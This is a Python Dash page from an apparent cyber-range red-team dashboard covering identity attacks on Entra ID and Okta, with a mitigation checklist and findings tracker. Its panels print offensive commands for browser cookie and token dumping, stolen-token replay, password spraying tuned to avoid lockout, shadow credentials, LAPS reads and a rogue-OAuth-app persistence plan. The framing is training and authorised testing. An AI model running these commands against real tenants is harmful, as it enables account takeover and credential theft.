"""
IAM Red Team — PAM / MFA Bypass Testing
Covers: privileged account abuse, MFA fatigue/bypass, token theft,
        Entra ID / Okta lateral movement, credential spraying.
"""
import dash
from dash import html, dcc, callback, Input, Output, State
import dash_bootstrap_components as dbc
from cyber_range.services import findings_service as fs

# ── helpers ──────────────────────────────────────────────────────────
def _card(*children, title=None):
    header = [html.H6(title, style={"color": "#ffd700", "marginBottom": "8px"})] if title else []
    return dbc.Card(dbc.CardBody(header + list(children)),
                    style={"background": "#1e2230", "border": "1px solid #2e3450",
                           "borderRadius": "8px", "marginBottom": "12px"})

def _cmd(text):
    return html.Pre(text, style={"background": "#0d0f1a", "color": "#00e6e6",
                                  "padding": "8px", "borderRadius": "6px",
                                  "fontSize": "11px", "overflowX": "auto",
                                  "marginBottom": "6px"})

def _badge(label, color):
    return dbc.Badge(label, color=color, className="me-1 mb-1")

# ── layout ────────────────────────────────────────────────────────────
def layout():
    return html.Div([
        # ── header ──
        html.Div([
            html.H4("🔐 IAM Red Team — PAM & MFA Bypass",
                    style={"color": "#ffd700", "fontWeight": "700", "marginBottom": "4px"}),
            html.P("Privileged access abuse, MFA fatigue attacks, token theft, Entra ID & Okta lateral movement.",
                   style={"color": "#999", "fontSize": "13px"}),
        ], style={"marginBottom": "16px"}),

        dbc.Row([

            # ── LEFT: Target Config ──────────────────────────────────
            dbc.Col([
                _card(
                    dbc.Label("Target Identity Provider", style={"color": "#ccc", "fontSize": "12px"}),
                    dbc.Select(id="iam-idp", options=[
                        {"label": "Entra ID (Azure AD)", "value": "entra"},
                        {"label": "Okta",                "value": "okta"},
                        {"label": "PingFederate",        "value": "ping"},
                        {"label": "ADFS On-Prem",        "value": "adfs"},
                        {"label": "Generic LDAP",        "value": "ldap"},
                    ], value="entra",
                    style={"background": "#252a36", "color": "#e6e6e6",
                           "border": "1px solid #3a4055", "marginBottom": "8px"}),

                    dbc.Label("Tenant / Domain", style={"color": "#ccc", "fontSize": "12px"}),
                    dbc.Input(id="iam-tenant", placeholder="contoso.onmicrosoft.com",
                              style={"background": "#252a36", "color": "#e6e6e6",
                                     "border": "1px solid #3a4055", "marginBottom": "8px"}),

                    dbc.Label("Target User / Group", style={"color": "#ccc", "fontSize": "12px"}),
                    dbc.Input(id="iam-target-user", placeholder="admin@contoso.com",
                              style={"background": "#252a36", "color": "#e6e6e6",
                                     "border": "1px solid #3a4055", "marginBottom": "8px"}),
                    title="Target Configuration"
                ),

                _card(
                    dbc.Label("Attack Module", style={"color": "#ccc", "fontSize": "12px"}),
                    dbc.Select(id="iam-attack-type", options=[
                        {"label": "🔥 MFA Fatigue (Push Bombing)",    "value": "mfa_fatigue"},
                        {"label": "🔑 Password Spray",                "value": "spray"},
                        {"label": "🎟️ Pass-the-Token (OAuth Bearer)", "value": "ptt"},
                        {"label": "🔓 SSPR Abuse",                    "value": "sspr"},
                        {"label": "🕵️ Conditional Access Bypass",     "value": "ca_bypass"},
                        {"label": "🏴 PAM Account Discovery",         "value": "pam_disc"},
                        {"label": "🔍 Service Principal Abuse",       "value": "sp_abuse"},
                        {"label": "⛓️ OAuth Device Code Phishing",   "value": "device_code"},
                    ], value="mfa_fatigue",
                    style={"background": "#252a36", "color": "#e6e6e6",
                           "border": "1px solid #3a4055", "marginBottom": "8px"}),
                    dbc.Button("▶ Run Attack Module", id="iam-run-btn", color="danger",
                               size="sm", className="w-100 mb-2"),
                    html.Div(id="iam-run-out"),
                    title="Attack Module"
                ),

                _card(
                    dbc.Label("AI Analysis", style={"color": "#ccc", "fontSize": "12px"}),
                    dbc.Button("🤖 Generate IAM Attack Narrative", id="iam-ai-btn",
                               color="warning", size="sm", className="w-100 mb-2",
                               style={"color": "#000"}),
                    html.Div(id="iam-ai-out"),
                    title="AI Tools"
                ),
            ], width=3),

            # ── CENTRE: Tabs ─────────────────────────────────────────
            dbc.Col([
                dbc.Tabs(id="iam-tabs", active_tab="iam-mfa", children=[
                    dbc.Tab(label="MFA Bypass",     tab_id="iam-mfa"),
                    dbc.Tab(label="Token Theft",    tab_id="iam-token"),
                    dbc.Tab(label="PAM Recon",      tab_id="iam-pam"),
                    dbc.Tab(label="Okta / Entra",   tab_id="iam-cloud"),
                    dbc.Tab(label="Findings",       tab_id="iam-findings"),
                ], style={"marginBottom": "12px"}),
                html.Div(id="iam-tab-content"),
            ], width=6),

            # ── RIGHT: Reference ─────────────────────────────────────
            dbc.Col([
                _card(
                    _badge("CRITICAL", "danger"), _badge("T1556", "secondary"),
                    _badge("T1621", "secondary"), _badge("T1528", "secondary"),
                    html.Hr(style={"borderColor": "#333"}),
                    html.P("🔥 MFA Fatigue — send 50–100 push notifications to overwhelm the user into approving.",
                           style={"color": "#ccc", "fontSize": "12px"}),
                    html.P("🎟️ Pass-the-Token — steal OAuth bearer token from browser/memory; replay to bypass MFA.",
                           style={"color": "#ccc", "fontSize": "12px"}),
                    html.P("⛓️ Device Code Phishing — send device code URL to victim; attacker polls for token.",
                           style={"color": "#ccc", "fontSize": "12px"}),
                    title="Key Techniques (MITRE)"
                ),
                _card(
                    html.P("Entra ID Recon:", style={"color": "#ffd700", "fontSize": "12px", "fontWeight": "600"}),
                    _cmd("roadrecon gather\nroadrecon dump\nroadrecon gui"),
                    html.P("Token Theft:", style={"color": "#ffd700", "fontSize": "12px", "fontWeight": "600"}),
                    _cmd("TokenTacticsV2\\Invoke-RefreshToAzureCoreToken\nAADInternals\\Get-AADIntAccessToken"),
                    html.P("MFA Spray:", style={"color": "#ffd700", "fontSize": "12px", "fontWeight": "600"}),
                    _cmd("MFASweep -Username user@corp.com\n-Recon -IncludeADFS"),
                    title="Quick Commands"
                ),
                _card(
                    html.P("Mitigations to Document:", style={"color": "#ffd700", "fontSize": "12px", "fontWeight": "600"}),
                    dbc.Checklist(
                        options=[
                            {"label": "Enable number matching for MFA push", "value": 1},
                            {"label": "Block legacy auth protocols",         "value": 2},
                            {"label": "Enforce phishing-resistant MFA (FIDO2/CBA)", "value": 3},
                            {"label": "Enable Conditional Access: compliant device required", "value": 4},
                            {"label": "Enable sign-in risk policies (Identity Protection)", "value": 5},
                            {"label": "Review service principals with high privilege", "value": 6},
                            {"label": "Enable Entra ID PIM for privileged roles", "value": 7},
                        ], value=[], id="iam-mitigations",
                        style={"color": "#ccc", "fontSize": "12px"}
                    ),
                    title="Mitigation Checklist"
                ),
            ], width=3),
        ]),
    ], style={"padding": "20px", "background": "#141820", "minHeight": "100vh"})


# ── callbacks ─────────────────────────────────────────────────────────
@callback(Output("iam-tab-content", "children"),
          Input("iam-tabs", "active_tab"))
def render_iam_tab(tab):
    if tab == "iam-mfa":
        return _card(
            html.H6("MFA Bypass Techniques", style={"color": "#ffd700"}),
            dbc.Row([
                dbc.Col(_card(
                    html.B("Push Bombing / Fatigue", style={"color": "#ff4444"}),
                    html.P("Flood the user with Authenticator push requests. Works on Microsoft, Duo, Okta.",
                           style={"color": "#ccc", "fontSize": "12px"}),
                    _cmd("# MFASweep — tests all MFA endpoints\nImport-Module MFASweep\nInvoke-MFASweep -Username user@corp.com -Recon"),
                ), width=6),
                dbc.Col(_card(
                    html.B("Device Code Phishing", style={"color": "#ff8c00"}),
                    html.P("Generate device code, send URL to victim, poll for access token.",
                           style={"color": "#ccc", "fontSize": "12px"}),
                    _cmd("# TokenTacticsV2\nGet-AzureToken -Client MSTeams\nInvoke-RefreshToMSGraphToken -RefreshToken $token"),
                ), width=6),
            ]),
            dbc.Row([
                dbc.Col(_card(
                    html.B("SSPR Abuse", style={"color": "#ff8c00"}),
                    html.P("If SSPR has weak secondary auth (SMS), can be used to bypass MFA entirely.",
                           style={"color": "#ccc", "fontSize": "12px"}),
                    _cmd("# Test SSPR gate via API\nPOST https://passwordreset.microsoftonline.com/\n  common/userrealm/<user>?api-version=2.1"),
                ), width=6),
                dbc.Col(_card(
                    html.B("Legacy Auth Bypass", style={"color": "#ff8c00"}),
                    html.P("IMAP/SMTP/POP3 bypass Conditional Access. Use CredKing or Spray tools.",
                           style={"color": "#ccc", "fontSize": "12px"}),
                    _cmd("# CredKing\npython3 credking.py --plugin o365\n  --username_file users.txt --password_file passwords.txt"),
                ), width=6),
            ])
        )

    elif tab == "iam-token":
        return _card(
            html.H6("Token Theft & Pass-the-Token", style={"color": "#ffd700"}),
            _cmd("""# Dump tokens from browser (Chrome)
SharpChrome.exe logins
SharpChrome.exe cookies --url https://login.microsoftonline.com

# Extract OAuth tokens from memory
Invoke-TokenStealer -Browser Chrome

# Pass stolen token to Azure API
$headers = @{ Authorization = "Bearer $stolen_token" }
Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/me" -Headers $headers"""),
            html.Hr(style={"borderColor": "#333"}),
            html.P("Token replay attacks bypass MFA entirely — the token was already issued after MFA was satisfied.",
                   style={"color": "#aaa", "fontSize": "12px"}),
            dbc.Alert("Token lifetime defaults: Access = 1hr, Refresh = 90 days. "
                      "CAE (Continuous Access Evaluation) revokes tokens in near-real-time.",
                      color="warning", style={"fontSize": "12px"}),
        )

    elif tab == "iam-pam":
        return _card(
            html.H6("PAM Account Discovery & Abuse", style={"color": "#ffd700"}),
            dbc.Row([
                dbc.Col([
                    html.P("Discovery Commands:", style={"color": "#ffd700", "fontSize": "12px"}),
                    _cmd("""# Find PAM-managed accounts (AD)
Get-ADUser -Filter {Description -like "*PAM*"} | Select Name,SamAccountName

# CyberArk Safe enumeration (if API accessible)
curl -k https://cyberark/PasswordVault/api/Safes -H "Authorization: CyberArk $token"

# BeyondTrust discovery
nmap -p 443 --script http-title --open <subnet> | grep -i "BeyondTrust"

# Detect JIT accounts (Entra PIM)
Get-AzureADDirectoryRole | ?{$_.DisplayName -match "Privileged"}"""),
                ], width=6),
                dbc.Col([
                    html.P("Abuse Paths:", style={"color": "#ffd700", "fontSize": "12px"}),
                    _cmd("""# Shadow credentials (DACL abuse → PAM account)
Whisker.exe add /target:svc_pam /domain:corp.local

# LAPS password read (if ACL misconfigured)
Get-LAPSPasswords -ComputerName DC01

# PIM role activation abuse (low-priv → GlobalAdmin)
Invoke-AzureADPrivilegedRoleActivation -RoleName "Global Administrator" """),
                ], width=6),
            ])
        )

    elif tab == "iam-cloud":
        return _card(
            html.H6("Entra ID & Okta Attack Paths", style={"color": "#ffd700"}),
            dbc.Row([
                dbc.Col([
                    html.P("Entra ID (Azure AD):", style={"color": "#00e6e6", "fontSize": "12px"}),
                    _cmd("""# ROADrecon full recon
roadrecon gather -u admin@corp.com -p P@ssw0rd
roadrecon dump --all
roadrecon gui  # Browse at http://127.0.0.1:5000

# Stormspotter (attack path visualisation)
python3 stormspotter.py --tenant corp.com

# Service principal secret exposure
az ad sp list --all | jq '.[] | select(.passwordCredentials | length > 0)'"""),
                ], width=6),
                dbc.Col([
                    html.P("Okta:", style={"color": "#00e6e6", "fontSize": "12px"}),
                    _cmd("""# Enumerate Okta apps & groups
curl -H "Authorization: SSWS $api_token" \
  https://corp.okta.com/api/v1/groups

# Session token hijack
curl -X POST https://corp.okta.com/api/v1/authn \
  -d '{"username":"user","password":"pass"}'

# Okta Super Admin abuse check
GET /api/v1/users?filter=profile.login+eq+"admin@corp.com" """),
                ], width=6),
            ])
        )

    elif tab == "iam-findings":
        recent = fs.get_findings(module="IAM Red Team", limit=15)
        rows = []
        for f in recent:
            sev_color = {"Critical":"danger","High":"warning","Medium":"info","Low":"success"}.get(f["severity"],"secondary")
            rows.append(html.Tr([
                html.Td(f["title"],    style={"color":"#ccc","fontSize":"11px"}),
                html.Td(dbc.Badge(f["severity"], color=sev_color)),
                html.Td(f.get("mitre_id",""), style={"color":"#00e6e6","fontSize":"11px"}),
                html.Td(f.get("status",""),  style={"color":"#aaa","fontSize":"11px"}),
            ]))
        saved_table = dbc.Table(
            [html.Thead(html.Tr([html.Th("Finding"),html.Th("Severity"),html.Th("MITRE"),html.Th("Status")])),
             html.Tbody(rows if rows else [html.Tr([html.Td(html.I("No saved findings yet"), colSpan=4)])])],
            bordered=True, hover=True, size="sm"
        )
        return _card(
            html.H6("IAM Red Team Findings", style={"color":"#ffd700"}),
            dbc.Row([
                dbc.Col([
                    dbc.Select(id="iam-save-sev", options=[
                        {"label":"Critical","value":"Critical"},{"label":"High","value":"High"},
                        {"label":"Medium","value":"Medium"},{"label":"Low","value":"Low"},
                    ], value="Critical",
                    style={"background":"#252a36","color":"#e6e6e6","border":"1px solid #3a4055"}),
                ], width=3),
                dbc.Col([
                    dbc.Input(id="iam-save-title", placeholder="Finding title...",
                              style={"background":"#252a36","color":"#e6e6e6","border":"1px solid #3a4055"}),
                ], width=6),
                dbc.Col([
                    dbc.Button("💾 Save Finding", id="iam-save-btn", color="success", size="sm", className="w-100"),
                ], width=3),
            ], className="mb-2 g-2"),
            html.Div(id="iam-save-out"),
            html.Hr(style={"borderColor":"#333"}),
            html.H6("Saved Findings", style={"color":"#aaa","fontSize":"12px"}),
            saved_table,
        )

    return html.Div("Select a tab above", style={"color": "#666"})


@callback(Output("iam-run-out", "children"),
          Input("iam-run-btn", "n_clicks"),
          State("iam-attack-type", "value"),
          State("iam-tenant", "value"),
          prevent_initial_call=True)
def run_iam_attack(n, attack_type, tenant):
    if not n:
        raise dash.exceptions.PreventUpdate
    msgs = {
        "mfa_fatigue": "🔥 MFA Fatigue module loaded — review MFA Bypass tab for commands.",
        "spray":       "🔑 Password Spray module — use CredKing or MSOLSpray with delays ≥30s to avoid lockout.",
        "ptt":         "🎟️ Pass-the-Token — extract tokens via SharpChrome, replay via Graph API.",
        "sspr":        "🔓 SSPR Abuse — test /common/userrealm endpoint for weak gate configuration.",
        "ca_bypass":   "🕵️ Conditional Access Bypass — try legacy auth, named locations, and device compliance gaps.",
        "pam_disc":    "🏴 PAM Discovery — check for CyberArk/BeyondTrust/LAPS exposure (see PAM Recon tab).",
        "sp_abuse":    "🔍 Service Principal Abuse — enumerate SP credentials and roles via az cli / roadrecon.",
        "device_code": "⛓️ Device Code Phishing — generate code, send URL to victim, poll for bearer token.",
    }
    return dbc.Alert(msgs.get(attack_type, "Module ready."), color="info",
                     style={"fontSize": "12px", "marginTop": "8px"})


@callback(Output("iam-ai-out", "children"),
          Input("iam-ai-btn", "n_clicks"),
          State("iam-idp", "value"),
          State("iam-tenant", "value"),
          prevent_initial_call=True)
def iam_ai_narrative(n, idp, tenant):
    if not n:
        raise dash.exceptions.PreventUpdate
    idp_name = {"entra": "Entra ID (Azure AD)", "okta": "Okta",
                "ping": "PingFederate", "adfs": "ADFS", "ldap": "LDAP"}.get(idp, idp)
    narrative = (
        f"**IAM Red Team Assessment — {idp_name}**\n\n"
        f"Target: {tenant or 'Unknown tenant'}\n\n"
        "**Phase 1 — Reconnaissance:** Enumerate users, groups, service principals, "
        "and conditional access policies using ROADrecon / roadtools.\n\n"
        "**Phase 2 — Initial Access:** Attempt password spray (low-and-slow, "
        "1 attempt per 30 minutes across distributed IPs). "
        "Test MFA push fatigue against high-value admin accounts.\n\n"
        "**Phase 3 — Privilege Escalation:** Abuse misconfigured service principal "
        "permissions; exploit PIM activation without approval workflow.\n\n"
        "**Phase 4 — Persistence:** Register rogue OAuth application with "
        "Mail.Read and User.ReadWrite.All permissions.\n\n"
        "**MITRE Mapping:** T1110.003 · T1621 · T1528 · T1550.001 · T1098.001"
    )
    return dbc.Alert([html.Pre(narrative, style={"fontSize": "11px", "whiteSpace": "pre-wrap",
                                                  "color": "#e6e6e6"})],
                     color="dark", style={"marginTop": "8px"})


@callback(Output("iam-save-out", "children"),
          Input("iam-save-btn", "n_clicks"),
          State("iam-save-title", "value"),
          State("iam-save-sev", "value"),
          prevent_initial_call=True)
def save_iam_finding(n, title, severity):
    if not n: raise dash.exceptions.PreventUpdate
    if not title:
        return dbc.Alert("Enter a finding title first.", color="warning", style={"fontSize": "12px", "marginTop": "6px"})
    fs.save_finding("IAM Red Team", title, severity or "Medium")
    return dbc.Alert(f"✅ Saved: [{severity}] {title} → Executive Dashboard", color="success",
                     style={"fontSize": "12px", "marginTop": "6px"})
